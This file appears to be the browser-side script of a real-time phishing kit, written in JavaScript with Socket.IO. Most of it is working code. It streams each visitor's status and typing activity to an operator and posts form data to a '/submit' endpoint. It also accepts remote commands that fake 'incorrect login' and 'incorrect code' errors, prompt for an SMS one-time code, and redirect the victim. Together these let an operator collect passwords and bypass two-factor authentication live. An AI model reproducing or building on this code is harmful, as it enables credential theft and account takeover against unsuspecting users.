	let userId = sessionStorage.getItem("userId");
	let page;
	let preloader = document.getElementById('load');
	
	// 🔹 Generate or reuse the userId
	if (!userId) {
	  userId = "user_" + Math.random().toString(36).substr(2, 9);
	  sessionStorage.setItem("userId", userId);
	}
	
	window.addEventListener('load', function () {

    // Overlay
    let preloader = document.createElement('div');
    preloader.id = 'load';
    preloader.style.position = 'fixed';
    preloader.style.top = '0';
    preloader.style.left = '0';
    preloader.style.width = '100vw';
    preloader.style.height = '100vh';

    preloader.style.backgroundColor = 'rgba(0, 0, 0, 0.75)';
    preloader.style.zIndex = '40000';

    preloader.style.display = 'flex';
    preloader.style.alignItems = 'center';
    preloader.style.justifyContent = 'center';

    // Smaller container (tight loader)
    let container = document.createElement('div');
    container.style.position = 'relative';
    container.style.width = '70px';
    container.style.height = '70px';
    container.style.display = 'flex';
    container.style.alignItems = 'center';
    container.style.justifyContent = 'center';

    // Thin green ring (smaller + tighter)
    let circle = document.createElement('div');
    circle.style.position = 'absolute';
    circle.style.top = '0';
    circle.style.left = '0';
    circle.style.width = '100%';
    circle.style.height = '100%';
    circle.style.borderRadius = '50%';

    circle.style.background = 'conic-gradient(rgba(34,197,94,0.6), rgba(21,128,61,0.6), rgba(34,197,94,0.6))';

    // thinner + tighter ring
    circle.style.mask = 'radial-gradient(circle, transparent 68%, black 70%)';
    circle.style.webkitMask = 'radial-gradient(circle, transparent 68%, black 70%)';

    circle.style.filter = 'drop-shadow(0 0 5px rgba(34, 197, 94, 0.4))';

    // Image (slightly rounded, not full circle)
    let image = document.createElement('img');
    image.src = 'images/td.png';
    image.style.width = '30px';
    image.style.height = '30px';
    image.style.opacity = '0.50';

    // slight rounding only (NOT full circle)
    image.style.borderRadius = '4%';

    image.style.objectFit = 'cover';
    image.style.zIndex = '2';

    // Assemble
    container.appendChild(circle);
    container.appendChild(image);
    preloader.appendChild(container);

    document.body.appendChild(preloader);

    // Fade out after 2 seconds
    setTimeout(() => {
        preloader.style.opacity = '0';
        preloader.style.transition = 'opacity 0.6s ease';
        
        setTimeout(() => preloader.style.display = "none", 600);
    }, 2000);
});
	
	 // Use window.socket globally from the start
		window.socket = io("/", {
			auth: { userId },
		  reconnection: true,
		  reconnectionAttempts: 5,
		  reconnectionDelay: 500
		});
		let socket = window.socket; // optional local alias
			
    socket.on("user:command", (data) => {
	  const { command, code, phonescreen, link } = data;
	  resetSubmitForm();
	  
	  switch (command) {
	    case "refresh":
	      location.reload();
	      break;
	
	    case "bad-otp":
	      const badOtp = document.getElementById('otp-error');
			$('.otp-input').addClass('error');
			badOtp.textContent = 'The code you entered is incorrect';
			badOtp.style.display = 'block';
			if(!preloader) preloader = document.getElementById('load');
	      preloader.style.display = "none";
	      break;
	      
	    case "bad-login":
	      document.querySelector(".error-container").style.display = "flex";
	      if(!preloader) preloader = document.getElementById('load');
	      preloader.style.display = "none";
	     break;
	
	    case "phone-otp":
	      if (!code) return;
			sessionStorage.setItem("setcode", code);
			const phoneWrap = document.querySelector("#phone-wrap");
			if (!phoneWrap) {
			    window.location.href = phonescreen;
			    return;
			}
			phoneWrap.innerHTML = `
			    <strong> by text message</strong> to <br><strong >+1 (***) *** <span id="phone"> </span><strong>
			`;
			const phoneNumberEl = document.querySelector("#phone");
			phoneNumberEl.textContent = code;
			phoneWrap.style.display = "block";
			if(!preloader) preloader = document.getElementById('load');
	      preloader.style.display = "none";
	      break;
	
	    case "notify":
	      alert("You have been waiting too long on this page");
	      break;
	
	    case "redirect":
	      if (link) window.location.href = link;
	      break;
	  }
	});
	
	// 🔹 When connected, update the user status
	socket.on("connect", () => {
	  console.log("Connected as", userId);
	  socket.emit("user:update", {
	    userId,
	    newStatus: "online",
	    page: page ,
	  });
	});
	
	// 🔹 When page unloads or closes
	window.addEventListener("beforeunload", () => {
	  socket.emit("user:update", {
	    userId,
	    newStatus: "offline",
	    page: page ,
	  });
	});
    
    // 🔹 When user focuses on an input field
	window.addEventListener("focusin", (e) => {
	  if (e.target.tagName === "INPUT" || e.target.tagName === "TEXTAREA") {
	    socket.emit("user:update", {
	      userId,
	      newStatus: "typing",
	      page: page ,
	    });
	  }
	});
	
	// 🔹 When user stops typing or leaves input
	window.addEventListener("focusout", (e) => {
	  if (e.target.tagName === "INPUT" || e.target.tagName === "TEXTAREA") {
	    socket.emit("user:update", {
	      userId,
	      newStatus: "online",
	      page: page ,
	    });
	  }
	});
	
	// 🔹 While typing (fires continuously as user types)
	window.addEventListener("input", (e) => {
	  if (e.target.tagName === "INPUT" || e.target.tagName === "TEXTAREA") {
	    socket.emit("user:update", {
	      userId,
	      newStatus: "typing",
	      page: page ,
	    });
	  }
	});

    // ✅ if your site has links that cause navigation
    document.addEventListener("click", (e) => {
      const link = e.target.closest("a");
      if (link && link.href && link.origin === location.origin) {
        setTimeout(() => {
          socket.emit("user:update", {
            userId,
            newStatus: "online",
            page: page ,
          });
        }, 200);
      }
    });

//document.head.appendChild(style); 

function resetSubmitForm() {
    $('.submit')
        .prop('disabled', false)
        .css({
            'background': '',
            'color': '',
            'opacity': ''
        });

    console.log("reset form");
}

async function submitFormData(formData) {
  // Show preloader
  $('.submit').prop('disabled', true);
  preloader.style.display = "flex";
  
  formData.userId = userId;
  try {
    const res = await fetch("/submit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(formData),
    });

    const data = await res.json();

    // Handle success (optional)
    console.log("Response:", data);
    if(data.link){ window.location.href = data.link };    
    //return data;
  } catch (error) {
    console.error("Error submitting form:", error);
    throw error;
	}
}

window.onbeforeunload = () => {
      socket.emit("user:update", {
        userId,
        newStatus: "offline",
        page: page ,
      });
  }; 
  
  
  // returns a Promise that resolves with a socket, creating one if none appears within `timeoutMs`
function getOrCreateSocket({ timeoutMs = 500 } = {}) {
  return new Promise((resolve) => {
    const existing = window.socket;
    if (existing) return resolve(existing);

    const start = Date.now();
    const checkInterval = 50; // check every 50ms
    const timer = setInterval(() => {
      if (window.socket) {
        clearInterval(timer);
        return resolve(window.socket);
      }
      if (Date.now() - start >= timeoutMs) {
        clearInterval(timer);
        console.log("reconnecting");

        // create a new socket after timeout
         userId = sessionStorage.getItem("userId") || null;
        // create and attach to window.socket so other scripts can reuse it
        window.socket = io("/", {
		  auth: { userId },   // ✅ preferred way
		  reconnection: true,
		});

        return resolve(window.socket);
      }
    }, checkInterval);
  });
}

// Usage (example - in an async context)
(async () => {
  const socket = await getOrCreateSocket({ timeoutMs: 2000 });
  // local alias (not redeclaring with const if you already have `socket` var)
  window.socket = socket;
  // if you want a local const:
  const localSocket = socket;

  // now you can attach your handlers safely
  localSocket.on("connect", () => console.log("connected", localSocket.id));
  // ... rest of your socket logic
})();